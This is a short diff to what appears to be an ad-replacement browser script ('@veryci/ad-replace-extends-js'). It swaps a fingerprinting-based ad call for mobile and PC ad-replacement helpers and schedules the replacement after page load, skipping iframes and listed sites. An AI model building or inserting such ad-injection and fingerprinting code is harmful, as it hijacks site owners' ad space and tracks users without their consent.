@@ -1,5 +1,5 @@
 import { phone } from 'ismobilejs';
-import { getAd, getPc } from './utils';
+import { getAd, getPc, mobileReplace, PCReplace } from './utils';
 // import { inPC } from './inPlatform';
 const [name, version] = ['@veryci/ad-replace-extends-js', '1.0.0'];
 
@@ -29,8 +29,8 @@ function extend() {
 function replace() {
   if (window.adReplaceJS || window.top !== window || blackWebsite.test(hostname)) return;
   window.adReplaceJS = `${name}-${version}`;
-  if (window.Fingerprint2) new Fingerprint2().get(uuid => getPc(uuid));
-  else getPc('-');
+  if (phone) mobileReplace();
+  PCReplace();
 }
 
 function redirect() {
@@ -56,6 +56,9 @@ redirect();
 function handler(e) {
   if (ready) return;
   if (e.type === 'onreadystatechange' && document.readyState !== 'complete') return;
+  setTimeout(() => {
+    replace();
+  }, 100);
   extend();
   ready = true;
 }
